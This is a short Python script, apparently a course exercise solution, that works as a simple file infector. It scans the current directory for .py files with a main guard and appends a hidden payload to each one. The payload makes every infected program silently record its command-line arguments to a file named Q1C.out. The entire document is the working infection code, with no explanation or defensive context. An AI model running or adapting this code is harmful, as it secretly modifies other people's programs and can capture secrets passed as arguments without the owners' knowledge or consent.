import os

if __name__ == "__main__":
    py_files = [f for f in os.listdir() if f[-3:] == ".py"]

    payload = r"""
    import sys
    with open('Q1C.out', 'a') as f:
        f.write(' '.join(sys.argv) + '\n')"""
    script_str = 'if __name__ == "__main__":'

    for py_file in py_files:
        with open(py_file, "r") as f:
            file_contents = f.read()

        if (script_str in file_contents) and (payload not in file_contents):
            with open(py_file, "a") as f:
                f.write(payload + "\n")

